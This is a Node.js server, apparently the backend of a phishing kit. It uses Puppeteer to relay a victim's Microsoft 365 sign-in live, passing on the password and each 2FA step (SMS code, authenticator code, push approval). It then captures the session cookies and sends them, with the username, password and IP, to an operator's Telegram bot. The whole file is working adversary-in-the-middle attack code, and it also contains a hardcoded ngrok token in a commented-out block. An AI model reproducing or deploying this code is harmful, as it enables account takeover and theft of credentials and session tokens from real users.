const express = require('express')
const puppeteer = require('puppeteer');
require("dotenv").config();
const app = express()
const PORT = process.env.PORT || 4000;
const http = require("http").Server(app);
const path = require("path");
const fs = require("fs").promises;
const { logininfo } = require("./log");
const cors = require("cors");
const TelegramBot = require('node-telegram-bot-api');
const { error } = require('console');

//attach http to the socket connection
const io = require("socket.io")(http);

app.use(express.json())
app.use(express.urlencoded({ extended: false }));
app.use(cors({ origin: "*" }));

const host = logininfo.host

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}


app.get('/', async function (req, res) {
  const browser = await puppeteer.launch({
    //headless: false,
    args: [
      "--disable-setuid-sandbox",
      "--no-sandbox",
      "--single-process",
      "--no-zygote",
    ],
    executablePath:
      process.env.NODE_ENV === "production"
        ? process.env.PUPPETEER_EXECUTABLE_PATH
        : puppeteer.executablePath(),
  });
  try {
  // ************ Evil Started ************** //
  const pageX = await browser.pages();
  const page = pageX[0];
  const browserid = await browser.wsEndpoint()
  await page.goto(logininfo.url.toString());
  await page.setViewport({ width: 1280, height: 720 });
  // ************ Browser Started ************** //
  await page.waitForSelector('#i0116');
  await page.locator('#i0116').fill(req.query.recipient);
  await page.waitForSelector('#idSIButton9');
  await page.locator('#idSIButton9').click();
  // ************ NAVIGATOR ************** //
  await sleep(4000)
  // ************ CHECK ASK ************** //
  const checker1 = await page.content()
  if(checker1.includes("do you want to use?")){
    await page.locator('#lightbox > div:nth-child(3) > div > div > div > div.form-group > div:nth-child(1)').click();
    await sleep(4000)
  }
  // ************ NAVIGATOR ************** //
  const detector = await page.content()
  if(detector.includes("ConvergedSignIn")){
      res.jsonp({
        recipient: req.query.recipient,
        engine: 1, // | 1 main | 2 Godaddy
        pass: "success", // success || failed
        ws: browserid
      })
  }else if(detector.includes("godaddy")){
    res.jsonp({
      recipient: req.query.recipient,
      engine: 2, // | 1 main | 2 Godaddy
      pass: "success", // success || failed
      ws: browserid
    })
  }else if(detector.includes("We couldn't find an account with that username.")){
    res.jsonp({
      recipient: "1",
      returner: "1",
      engine: 0, // | 0 Failed
      pass: "fail_username", // success || failed
      call: "error"
    })
    browser.close()
  }else{
    res.jsonp({
      recipient: "1",
      returner: "1",
      engine: -1, // | 0 Failed
      pass: "failed", // success || failed
      call: "error"
    })
    browser.close()
  }
} catch (error) {
  res.jsonp({
    recipient: req.query.recipient,
    engine: 0, // | 1 main | 2 Godaddy
    pass: "error", // success || failed
    call: "error"
  })
  browser.close()
}

})

app.get('/Password', async function (req, res) { 
try {
  // ******************************** MAIN OFFICE ******************************** //
  const browser = await puppeteer.connect({
    browserWSEndpoint: req.query.ws
  })
  const pageX = await browser.pages();
  const page = pageX[0];
  const bot = req.query.telbot;
  const chatid = req.query.chatid;
  const RESULT_PROCESSOR = req.query.RESULT_PROCESSOR;
  // ********************************** ACTION BEGINS ********************************************* //
  await page.waitForSelector("#i0118");
  await page.locator('#i0118').click({ count: 3 })
  await page.locator('#i0118').fill(req.query.password);
  await page.locator('#idSIButton9').click();
  await page.waitForNavigation();
  await sleep(3000);
  // ******************************* EVENT LISTENERS *********************************************** //
  const html = await page.content();
  if(html.includes("Your account or password is incorrect.")){
    if(RESULT_PROCESSOR == 0){
      await Invalid_Demon666(bot, chatid, req.query.recipient, req.query.password, req.ip);
    }
    res.jsonp({
      recipient: req.query.recipient,
      pass: "password_failed", // success || failed
    })
  } else if(html.includes("Approve sign in request")){
    res.jsonp({
      recipient: req.query.recipient,
      pass: "2FA_AUTH_TAP", // success || failed
    })
  } else if(html.includes("SMS TEXT")){
    res.jsonp({
      recipient: req.query.recipient,
      pass: "2FA_SMS_CODE", // success || failed
    })
  } else if(html.includes("AUTH CODE")){
    res.jsonp({
      recipient: req.query.recipient,
      pass: "2FA_AUTH_CODE", // success || failed
    })
  } else if(html.includes("Verify your identity")){
    res.jsonp({
      recipient: req.query.recipient,
      pass: "2FA", // success || failed
    })
  } else if(html.includes("Stay signed in?")){
    console.log("stucked")
    res.jsonp({
      recipient: req.query.recipient,
      pass: "success", // success || failed
    })
    await page.locator('#idSIButton9').click()
    await page.waitForNavigation()
    await page.goto("https://login.microsoftonline.com/jsdisabled")
    await sleep(2000)
    const cookies = await page.cookies()
    await sleep(2000)
    console.log("login success");
    const auth_type = "NON 2FA"
    await ValidDemon666(cookies, bot, chatid, req.query.recipient, req.query.password, req.ip, auth_type)
    setTimeout(() => {
        browser.close()
    }, 10000);
    // ************ Succcess ************ //
  } else if(html.includes("Sign out")){
    res.jsonp({
      recipient: req.query.recipient,
      pass: "success", // success || failed
    })
    // ************ Success ************ //
    await page.goto("https://login.microsoftonline.com/jsdisabled")
    await sleep(2000)
    const cookies = await page.cookies()
    await sleep(2000)
    console.log("login success");
    const auth_type = "NON 2FA"
    await ValidDemon666(cookies, bot, chatid, req.query.recipient, req.query.password, req.ip, auth_type)
    setTimeout(() => {
        browser.close()
    }, 10000);
    // ************ Succcess ************ //
  }
} catch (error) {
  res.jsonp({
    recipient: req.query.recipient,
    pass: "error", // success || failed
  })
}
})

app.get('/2FA_AUTH_TAP_LISTEN', async function (req, res) { 
  try {
    const browser = await puppeteer.connect({
      browserWSEndpoint: req.query.ws
    })
    const pageX = await browser.pages();
    const page = pageX[0];
    const html = await page.content()
    if(html.includes("Stay signed in?")){
      res.jsonp({
        pass: "success", // success || failed
      })
      await page.locator('#idSIButton9').click()
      await page.waitForNavigation()
      await page.goto("https://login.microsoftonline.com/jsdisabled")
      await sleep(2000)
      const cookies = await page.cookies()
      await sleep(2000)
      console.log("login success");
      const auth_type = "AUTHENTICATOR"
      await ValidDemon666(cookies, bot, chatid, req.query.recipient, req.query.password, req.ip, auth_type)
      setTimeout(() => {
          browser.close()
      }, 10000);
    } else if(html.includes("Sign out")){
      res.jsonp({
        pass: "success", // success || failed
      })
      await page.goto("https://login.microsoftonline.com/jsdisabled")
      await sleep(2000)
      const cookies = await page.cookies()
      await sleep(2000)
      console.log("login success");
      const auth_type = "AUTHENTICATOR"
      await ValidDemon666(cookies, bot, chatid, req.query.recipient, req.query.password, req.ip, auth_type)
      setTimeout(() => {
          browser.close()
      }, 10000);
    } else {
      res.jsonp({
        pass: "error", // success || failed
      })
    }
  } catch {
    res.jsonp({
      pass: "error", // success || failed
    })
  }
})



// LISTEN TO 2FA_AUTH_APP
app.get('/2FA_AUTH_TAP_GET_CODE', async function (req, res) { 
  try {
    const browser = await puppeteer.connect({
      browserWSEndpoint: req.query.ws
    })
    const pageX = await browser.pages();
    const page = pageX[0];
    const code = await page.$eval("#idRichContext_DisplaySign", el => el.textContent)
    res.jsonp({
      code: code, // success || failed
    })
  } catch {
    res.jsonp({
      code: 0, // success || failed
    })
  }
})



// LISTEN TO 2FA_METHODS
app.get('/2FA_METHOD', async function (req, res) { 
  try {
    const browser = await puppeteer.connect({
      browserWSEndpoint: req.query.ws
    })
    const pageX = await browser.pages();
    const page = pageX[0];
    //
    const ParseM1 = "#idDiv_SAOTCS_Proofs > div:nth-child(1)"
    const ParseM2 = "#idDiv_SAOTCS_Proofs > div:nth-child(2)"
    const ParseM3 = "#idDiv_SAOTCS_Proofs > div:nth-child(3)"

    const memo1 = await page.$(ParseM1) ? await page.$eval(ParseM1, el => el.textContent) : "";
    const memo2 = await page.$(ParseM2) ? await page.$eval(ParseM2, el => el.textContent) : "";
    const memo3 = await page.$(ParseM3) ? await page.$eval(ParseM3, el => el.textContent) : "";

    let method1_type = ""
    let method1_text = ""
    let method2_type = ""
    let method2_text = ""
    let method3_type = ""
    let method3_text = ""

    if(memo1.includes("Approve a request")){
      method1_type = "2FA_AUTH_TAP"
      method1_text = memo1
    } else if(memo1.includes("verification code")){
      method1_type = "2FA_AUTH_CODE"
      method1_text = memo1
    } else if(memo1.includes("Text")){
      method1_type = "2FA_SMS_CODE"
      method1_text = memo1
    } else {
      method1_type = ""
      method1_text = ""
    }

    if(memo2.includes("Approve a request")){
      method2_type = "2FA_AUTH_TAP"
      method2_text = memo2
    } else if(memo2.includes("verification code")){
      method2_type = "2FA_AUTH_CODE"
      method2_text = memo2
    } else if(memo2.includes("Text")){
      method2_type = "2FA_SMS_CODE"
      method2_text = memo2
    } else {
      method2_type = ""
      method2_text = ""
    }


    if(memo3.includes("Approve a request")){
      method3_type = "2FA_AUTH_TAP"
      method3_text = memo3
    } else if(memo3.includes("verification code")){
      method3_type = "2FA_AUTH_CODE"
      method3_text = memo3
    } else if(memo3.includes("Text")){
      method3_type = "2FA_SMS_CODE"
      method3_text = memo3
    } else {
      method3_type = ""
      method3_text = ""
    }
    
    res.jsonp({
      pass: "success", // success || failed
      method1_text: method1_text,
      method1_type: method1_type,
      method2_text: method2_text,
      method2_type: method2_type,
      method3_text: method3_text,
      method3_type: method3_type,
    })
  } catch(e) {
    console.log(e)
    res.jsonp({
      pass: "error", // success || failed
    })
  }
})







app.get('/2FA_METHOD_SELECTOR', async function (req, res) { 
  try {
    const browser = await puppeteer.connect({
      browserWSEndpoint: req.query.ws
    })
    const pageX = await browser.pages();
    const page = pageX[0];
    await page.locator("#idDiv_SAOTCS_Proofs > div:nth-child("+req.query.method+")").click()
    await sleep(4000);
    res.jsonp({
      pass: "success", // success || failed
    })
  } catch(e) {
    console.log(e)
    res.jsonp({
      pass: "error", // success || failed
    })
  }
})



app.get('/2FA_AUTH_CODE', async function (req, res) { 
  try {
    const browser = await puppeteer.connect({
      browserWSEndpoint: req.query.ws
    })
    const pageX = await browser.pages();
    const page = pageX[0];
    await page.locator("#idTxtBx_SAOTCC_OTC").click({ count: 3 })
    await page.locator("#idTxtBx_SAOTCC_OTC").fill(req.query.code)
    await page.locator("#idSubmit_SAOTCC_Continue").click()
    await sleep(4000);
    const html = await page.content()
    // 
    if(html.includes("enter the expected verification code")){
      res.jsonp({
        pass: "error", // success || failed
      })
    } else if(html.includes("Stay signed in?")){
      res.jsonp({
        pass: "success", // success || failed
      })
      await page.locator('#idSIButton9').click()
      await page.waitForNavigation()
      await page.goto("https://login.microsoftonline.com/jsdisabled")
      await sleep(2000)
      const cookies = await page.cookies()
      await sleep(2000)
      console.log("login success");
      const auth_type = "AUTH CODE"
      await ValidDemon666(cookies, bot, chatid, req.query.recipient, req.query.password, req.ip, auth_type)
      setTimeout(() => {
          browser.close()
      }, 10000);
    } else if(html.includes("Sign out")){
      res.jsonp({
        pass: "success", // success || failed
      })
      await page.goto("https://login.microsoftonline.com/jsdisabled")
      await sleep(2000)
      const cookies = await page.cookies()
      await sleep(2000)
      console.log("login success");
      const auth_type = "AUTH CODE"
      await ValidDemon666(cookies, bot, chatid, req.query.recipient, req.query.password, req.ip, auth_type)
      setTimeout(() => {
          browser.close()
      }, 10000);
    }
  } catch {
    res.jsonp({
      pass: "failed", // success || failed
    })
  }
})

app.get('/2FA_SMS_CODE_LISTENER', async function (req, res) { 
  try {
    const browser = await puppeteer.connect({
      browserWSEndpoint: req.query.ws
    })
    const pageX = await browser.pages();
    const page = pageX[0];
    const html = await page.content()
    const auth_text = await page.$eval("#idDiv_SAOTCC_Description", el => el.textContent);
    res.jsonp({
      pass: "success", // success || failed
      auth_text: auth_text
    })
  } catch {
    res.jsonp({
      pass: "error", // success || failed
    })
  }
})

app.get('/2FA_SMS_CODE', async function (req, res) { 
  try {
    const browser = await puppeteer.connect({
      browserWSEndpoint: req.query.ws
    })
    const pageX = await browser.pages();
    const page = pageX[0];
    await page.locator("#idTxtBx_SAOTCC_OTC").click({ count: 3 })
    await page.locator("#idTxtBx_SAOTCC_OTC").fill(req.query.code)
    await page.locator("#idSubmit_SAOTCC_Continue").click()
    await sleep(4000);
    const html = await page.content()
    if(html.includes("enter the expected verification code")){
      res.jsonp({
        pass: "error", // success || failed
      })
    } else if(html.includes("Stay signed in?")){
      res.jsonp({
        pass: "success", // success || failed
      })
      await page.locator('#idSIButton9').click()
      await page.waitForNavigation()
      await page.goto("https://login.microsoftonline.com/jsdisabled")
      await sleep(2000)
      const cookies = await page.cookies()
      await sleep(2000)
      console.log("login success");
      const auth_type = "SMS CODE"
      await ValidDemon666(cookies, bot, chatid, req.query.recipient, req.query.password, req.ip, auth_type)
      setTimeout(() => {
          browser.close()
      }, 10000);
    } else if(html.includes("Sign out")){
      res.jsonp({
        pass: "success", // success || failed
      })
      await page.goto("https://login.microsoftonline.com/jsdisabled")
      await sleep(2000)
      const cookies = await page.cookies()
      await sleep(2000)
      console.log("login success");
      const auth_type = "SMS CODE"
      await ValidDemon666(cookies, bot, chatid, req.query.recipient, req.query.password, req.ip, auth_type)
      setTimeout(() => {
          browser.close()
      }, 10000);
    }
  } catch {
    res.jsonp({
      pass: "error", // success || failed
    })
  }
})


// || ------------ RETURN TO 2FA PAGE ------------ || // 
app.get('/2FA_AUTH_TAP_GOBACK', async function (req, res) { 
  try {
    const browser = await puppeteer.connect({
      browserWSEndpoint: req.query.ws
    })
    const pageX = await browser.pages();
    const page = pageX[0];
    await page.locator("#signInAnotherWay").click()
    await sleep(2000);
    res.jsonp({
      pass: "success", // success || failed
    })
  } catch {
    res.jsonp({
      pass: "error", // success || failed
    })
  }
})

// || ------------ RETURN TO 2FA PAGE ------------ || // 
app.get('/2FA_AUTH_CODE_RETURN_TO_2FA', async function (req, res) { 
  try {
    const browser = await puppeteer.connect({
      browserWSEndpoint: req.query.ws
    })
    const pageX = await browser.pages();
    const page = pageX[0];
    // #idBtn_Back
    res.jsonp({
      pass: "success", // success || failed
    })
  } catch (e){
    res.jsonp({
      pass: "error", // success || failed
    })
  }
})


// || ------------ RETURN TO 2FA PAGE ------------ || // 
app.get('/2FA_SMS_CODE_RETURN_TO_2FA', async function (req, res) { 
  try {
    const browser = await puppeteer.connect({
      browserWSEndpoint: req.query.ws
    })
    const pageX = await browser.pages();
    const page = pageX[0];
    // #idBtn_Back
    res.jsonp({
      pass: "success", // success || failed
    })
  } catch (e){
    res.jsonp({
      pass: "error", // success || failed
    })
  }
})


http.listen(PORT, () => {
  console.log(`Example app listening on port ${PORT}`)
})



async function ValidDemon666(cookies, telbot, chatid, email, password, ip, auth_type){
  var ozi = "\n 🕊️🕊️🕊️🕊️ O365 @BYPASSED 🕊️🕊️🕊️🕊️\n"
       ozi+="\n------- 🦅 ------- \n";
       ozi+="Username: "+email+"\n"
       ozi+="Password: "+password
       ozi+="\nAUTH: "+auth_type
       ozi+="\n *** IP *** : "+ip
       ozi+="\n------- 🦅 ------- \n";
       ozi+="\n🕊️🕊️🕊️🕊️ LUCIFER17 🕊️🕊️🕊️🕊️";
  const Filename = email+"__2FA_@BYPASS_.txt";
  const cookies2 = JSON.stringify(cookies, null, 2);
  const C1 = await fs.readFile("./Lib/CParser/C1.txt")
  const C2 = await fs.readFile("./Lib/CParser/C2.txt")
  const data = C1+cookies2+C2;
  const SaveCoookie = await fs.writeFile("./Cookies/"+Filename, data);
  await tmsend(ozi)
  async function tmsend(message){
        var token = telbot;
        var chat_id= chatid;
        const bot = new TelegramBot(token, { polling: true });
        // Reply to the Bot
        bot.sendMessage(chat_id, message)
        // Sending the document
        bot.sendDocument(chat_id, "./Cookies/"+Filename);
  }
  return 1;
}

async function Demon666(cookies, telbot, chatid, email, password, ip){
  var ozi = "\n 🕊️🕊️🕊️🕊️ O365 GLORY 🕊️🕊️🕊️🕊️\n"
       ozi+="\n------- 🦅 ------- \n";
       ozi+="Username: "+email+"\n"
       ozi+="Password: "+password
       ozi+="\n *** IP *** : "+ip
       ozi+="\n------- 🦅 ------- \n";
       ozi+="\n🕊️🕊️🕊️🕊️ LUCIFER17 🕊️🕊️🕊️🕊️";
  const Filename = email+"__Valid___NON2FA__.txt";
  const cookies2 = JSON.stringify(cookies, null, 2);
  const C1 = await fs.readFile("./Lib/CParser/C1.txt")
  const C2 = await fs.readFile("./Lib/CParser/C2.txt")
  const data = C1+cookies2+C2;
  const SaveCoookie = await fs.writeFile("./Cookies/"+Filename, data);
  await tmsend(ozi)
  async function tmsend(message){
        var token = telbot;
        var chat_id= chatid;
        const bot = new TelegramBot(token, { polling: true });
        // Reply to the Bot
        bot.sendMessage(chat_id, message)
        // Sending the document
        bot.sendDocument(chat_id, "./Cookies/"+Filename);
  }
  return 1;
}



async function Invalid_Demon666(telbot, chatid, email, password, ip){
  var ozi = "\n 🕊️🕊️🕊️🕊️ INVALID O365 GLORY 🕊️🕊️🕊️🕊️\n"
       ozi+="\n------- 🦅 ------- \n";
       ozi+="Username: "+email+"\n"
       ozi+="Password: "+password
       ozi+="\n *** IP *** : "+ip
       ozi+="\n------- 🦅 ------- \n";
       ozi+="\n🕊️🕊️🕊️🕊️ LUCIFER17 🕊️🕊️🕊️🕊️";
  await tmsend(ozi)
  async function tmsend(message){
        var token = telbot;
        var chat_id= chatid;
        const bot = new TelegramBot(token, { polling: true });
        bot.sendMessage(chat_id, message)
  }
  return 1;
}

// app.listen(PORT, async () => {
//   console.log(`Example app listening at http://localhost:${PORT}`)
//   ngrok.connect({ addr: PORT, authtoken: "2hBgpguJ5YGltFep0ySQevgZLQB_4DtXL7GMT69yMFraSuKRa" })
// })